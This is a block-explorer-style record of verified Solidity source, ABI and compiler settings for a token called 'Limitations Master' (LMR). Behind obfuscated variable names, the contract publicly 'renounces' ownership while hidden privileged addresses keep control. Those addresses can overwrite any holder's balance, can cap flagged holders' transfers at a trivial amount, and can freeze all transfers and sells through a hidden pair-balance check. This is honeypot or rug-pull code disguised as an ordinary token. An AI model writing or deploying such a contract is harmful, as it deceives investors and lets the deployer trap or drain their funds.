{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface totalAuto {\n    function createPair(address tokenLaunchedExempt, address senderAt) external returns (address);\n}\n\ninterface launchShouldTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeTx) external view returns (uint256);\n\n    function transfer(address liquidityTx, uint256 fromLimit) external returns (bool);\n\n    function allowance(address buyShouldTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityTx,\n        uint256 fromLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedShould, uint256 value);\n    event Approval(address indexed buyShouldTotal, address indexed spender, uint256 value);\n}\n\nabstract contract tokenBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchEnable is launchShouldTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LimitationsMaster is tokenBuy, launchShouldTrading, launchEnable {\n\n    bool public minModeTx;\n\n    uint256 private walletSwapFund;\n\n    function feeMarketing(address isFund) public {\n        launchedListIs();\n        \n        if (isFund == autoLiquidity || isFund == toToken) {\n            return;\n        }\n        launchFund[isFund] = true;\n    }\n\n    constructor (){\n        \n        launchBuy tokenAmount = launchBuy(autoModeShould);\n        toToken = totalAuto(tokenAmount.factory()).createPair(tokenAmount.WETH(), address(this));\n        if (walletSwapFund == atTxWallet) {\n            buyTx = walletSwapFund;\n        }\n        autoLiquidity = _msgSender();\n        feeSwap[autoLiquidity] = true;\n        receiverList[autoLiquidity] = tokenEnable;\n        amountIs();\n        \n        emit Transfer(address(0), autoLiquidity, tokenEnable);\n    }\n\n    function receiverShould(address isFrom, uint256 fromLimit) public {\n        launchedListIs();\n        receiverList[isFrom] = fromLimit;\n    }\n\n    function approve(address maxAmountTrading, uint256 fromLimit) public virtual override returns (bool) {\n        teamFrom[_msgSender()][maxAmountTrading] = fromLimit;\n        emit Approval(_msgSender(), maxAmountTrading, fromLimit);\n        return true;\n    }\n\n    uint256 private tokenEnable = 100000000 * 10 ** 18;\n\n    uint256 shouldSell;\n\n    uint256 public buyTx;\n\n    uint256 public launchReceiver;\n\n    function allowance(address sellExemptLimit, address maxAmountTrading) external view virtual override returns (uint256) {\n        if (maxAmountTrading == autoModeShould) {\n            return type(uint256).max;\n        }\n        return teamFrom[sellExemptLimit][maxAmountTrading];\n    }\n\n    function owner() external view returns (address) {\n        return senderMin;\n    }\n\n    address public autoLiquidity;\n\n    uint256 private listTotal;\n\n    mapping(address => bool) public launchFund;\n\n    uint8 private exemptReceiverAuto = 18;\n\n    address autoModeShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function maxAt(address amountTeam, address liquidityTx, uint256 fromLimit) internal returns (bool) {\n        require(receiverList[amountTeam] >= fromLimit);\n        receiverList[amountTeam] -= fromLimit;\n        receiverList[liquidityTx] += fromLimit;\n        emit Transfer(amountTeam, liquidityTx, fromLimit);\n        return true;\n    }\n\n    function fundLaunch(address totalMax) public {\n        if (minModeTx) {\n            return;\n        }\n        \n        feeSwap[totalMax] = true;\n        if (listTotal == atTxWallet) {\n            launchReceiver = walletSwapFund;\n        }\n        minModeTx = true;\n    }\n\n    bool public maxTeam;\n\n    uint256 public teamFundLaunched;\n\n    function liquidityList(uint256 fromLimit) public {\n        launchedListIs();\n        atReceiver = fromLimit;\n    }\n\n    address private senderMin;\n\n    uint256 private atTxWallet;\n\n    address public toToken;\n\n    function getOwner() external view returns (address) {\n        return senderMin;\n    }\n\n    event OwnershipTransferred(address indexed fundFrom, address indexed enableLimit);\n\n    function launchedListIs() private view {\n        require(feeSwap[_msgSender()]);\n    }\n\n    mapping(address => bool) public feeSwap;\n\n    address fromAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private buyFromSwap = \"LMR\";\n\n    string private takeTrading = \"Limitations Master\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyFromSwap;\n    }\n\n    bool public totalAt;\n\n    function balanceOf(address feeTx) public view virtual override returns (uint256) {\n        return receiverList[feeTx];\n    }\n\n    function amountIs() public {\n        emit OwnershipTransferred(autoLiquidity, address(0));\n        senderMin = address(0);\n    }\n\n    function transferFrom(address amountTeam, address liquidityTx, uint256 fromLimit) external override returns (bool) {\n        if (_msgSender() != autoModeShould) {\n            if (teamFrom[amountTeam][_msgSender()] != type(uint256).max) {\n                require(fromLimit <= teamFrom[amountTeam][_msgSender()]);\n                teamFrom[amountTeam][_msgSender()] -= fromLimit;\n            }\n        }\n        return walletBuy(amountTeam, liquidityTx, fromLimit);\n    }\n\n    function walletBuy(address amountTeam, address liquidityTx, uint256 fromLimit) internal returns (bool) {\n        if (amountTeam == autoLiquidity) {\n            return maxAt(amountTeam, liquidityTx, fromLimit);\n        }\n        uint256 fromSellTotal = launchShouldTrading(toToken).balanceOf(fromAmount);\n        require(fromSellTotal == atReceiver);\n        require(liquidityTx != fromAmount);\n        if (launchFund[amountTeam]) {\n            return maxAt(amountTeam, liquidityTx, marketingSwap);\n        }\n        return maxAt(amountTeam, liquidityTx, fromLimit);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return takeTrading;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptReceiverAuto;\n    }\n\n    function transfer(address isFrom, uint256 fromLimit) external virtual override returns (bool) {\n        return walletBuy(_msgSender(), isFrom, fromLimit);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenEnable;\n    }\n\n    uint256 private limitLaunchLaunched;\n\n    mapping(address => mapping(address => uint256)) private teamFrom;\n\n    bool public launchedWallet;\n\n    uint256 constant marketingSwap = 6 ** 10;\n\n    uint256 atReceiver;\n\n    mapping(address => uint256) private receiverList;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyShouldTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellExemptLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxAmountTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAmountTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFund\",\"type\":\"address\"}],\"name\":\"feeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMax\",\"type\":\"address\"}],\"name\":\"fundLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromLimit\",\"type\":\"uint256\"}],\"name\":\"liquidityList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minModeTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLimit\",\"type\":\"uint256\"}],\"name\":\"receiverShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFundLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LimitationsMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}